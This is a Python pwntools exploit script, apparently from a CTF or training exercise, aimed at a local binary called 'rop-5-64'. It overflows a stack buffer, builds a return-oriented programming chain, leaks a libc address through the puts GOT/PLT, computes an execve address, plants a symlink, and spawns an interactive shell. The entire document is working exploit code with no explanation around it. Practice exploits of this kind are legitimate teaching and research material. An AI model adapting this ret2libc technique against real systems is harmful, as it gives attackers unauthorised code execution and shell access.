#!/usr/bin/env python

from pwn import *
from os import *

p = process("./rop-5-64")

got_of_puts = p.elf.got['puts']
puts_at_plt = p.elf.plt['puts']
input_func = p.elf.symbols['input_func']
print("Got of puts %s" % hex(got_of_puts))
print("Puts@plt %s" % hex(puts_at_plt))
print("input_func() %s" % hex(input_func))

'''
0x0000000000400763 : pop rdi ; ret
0x0000000000400688 : pop rdx ; nop ; pop rbp ; ret
0x0000000000400761 : pop rsi ; pop r15 ; ret
'''

pop_rdi = p64(0x400763)
pop_rsi_r15 = p64(0x400761)
pop_rdx_rbp = p64(0x400688)

buf = "A" * 0x80 + "BBBBBBBB"

buf += pop_rdi + p64(got_of_puts) + p64(puts_at_plt)
buf += p64(input_func)      # get the second chance to exploit

p.recvline()

p.sendline(buf)

data = p.recvline()

print(repr(data))

line = p.recvuntil('\x7f')

print(repr(line))

line += "\x00\x00"

libc_addr = u64(line)

print("Addr of printf %s" % hex(libc_addr))

offset = 0x7fd11118b770 - 0x7fd11112e690

libc_execve = libc_addr + offset

print ("Addr of printf in libc %s" % hex(libc_execve))

string = p64(0x4006c0)

if os.path.exists("\270"):
    os.unlink("\270")
os.symlink("H","\270")

buf =  "A" * 0x80 + "BBBBBBBB"

buf += pop_rdi + string + pop_rsi_r15 + p64(0) + p64(0) + pop_rdx_rbp + p64(0) + p64(0) + p64(libc_execve)

print(buf)

p.sendline(buf)

p.interactive()
